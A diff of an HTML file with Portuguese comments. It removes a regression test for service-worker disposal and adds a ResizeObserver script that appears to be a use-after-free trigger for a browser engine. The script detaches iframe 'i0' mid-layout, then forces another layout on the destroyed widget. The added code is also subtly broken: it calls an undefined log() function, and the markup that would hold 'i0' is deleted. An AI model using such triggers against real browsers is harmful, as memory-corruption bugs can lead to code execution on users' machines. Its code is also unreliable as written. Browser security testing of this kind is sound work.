@@ -1,71 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Teste de Regressão: Descarte de Service Worker com FetchEvents e VM ativa</title>
-</head>
-<body>
-<div id="status">Executando teste...</div>
-
 <script>
-function gc() {
-    function gcRec(n) {
-        if (n < 1)
-            return {};
-        var temp = { i: "ab" + i + (i / 100000) };
-        temp += "foo";
-        gcRec(n - 1);
-    }
-    for (var i = 0; i < 1000; i++)
-        gcRec(10);
-}
+onload = () => {
+    document.documentElement.append(document.createElement('frameset'));
+    const i0 = document.getElementById('i0');
 
-const swCode = `
-    self.addEventListener('fetch', (event) => {
-        // Retém o FetchEvent ativo no conjunto m_extendedEvents
-        event.respondWith(new Promise((resolve) => {
-            // Promessa pendente mantida até o descarte forçado
-            setTimeout(() => {
-                resolve(new Response("ok"));
-            }, 5000);
-        }));
+    let fired = false;
+    const ro = new ResizeObserver((entries) => {
+        if (fired) return;
+        fired = true;
+        log('[+] ResizeObserver fired (post-layout)');
+
+        // Neste ponto: layout acabou, mas cleanup do scope pode estar processando
+        i0.remove();
+
+        // Forçar outro layout que vai tentar processar o widget já destruído
+        void document.body.offsetWidth;
+        void document.documentElement.getBoundingClientRect();
     });
-`;
 
-async function runServiceWorkerVMTest() {
-    if (!navigator.serviceWorker) {
-        document.getElementById("status").innerText = "PASS: Service Worker não suportado.";
-        return;
-    }
+    ro.observe(i0);
 
-    const swBlobUrl = URL.createObjectURL(new Blob([swCode], { type: "application/javascript" }));
-    const scope = "./sw-vm-scope-" + Date.now() + "/";
-
-    for (let cycle = 0; cycle < 25; cycle++) {
-        try {
-            // 1. Registra o Service Worker
-            const reg = await navigator.serviceWorker.register(swBlobUrl, { scope: scope });
-            await navigator.serviceWorker.ready;
-
-            // 2. Dispara requisições fetch para instanciar FetchEvents e registrá-los em m_extendedEvents
-            for (let f = 0; f < 5; f++) {
-                fetch(`${scope}request-${f}`).catch(() => {});
-            }
-
-            // 3. Força unregister/terminação imediata com os FetchEvents ainda pendentes
-            await reg.unregister();
-
-            // 4. Dispara pressão no GC para desmantelar a VM do worker
-            gc();
-        } catch (e) {}
-    }
-
-    document.getElementById("status").innerText = "PASS: Descarte de ServiceWorkerGlobalScope sem UAF na VM.";
-}
-
-runServiceWorkerVMTest().catch((err) => {
-    document.getElementById("status").innerText = "FAIL: " + err.message;
-});
+    // Trigger: mudar dimensão do iframe ? dispara layout ? ResizeObserver
+    location.hash = 'x';
+    
+    const s = document.createElement('script');
+    s.src = `data:text/javascript,` +
+        `Promise.resolve().then(() => {` +
+            `const i = document.getElementById('i0');` +
+            `if(i) { i.style.width = '50px'; }` +  // Muda tamanho ? layout ? observer
+        `})`;
+    document.head.append(s);
+};
 </script>
-</body>
-</html>
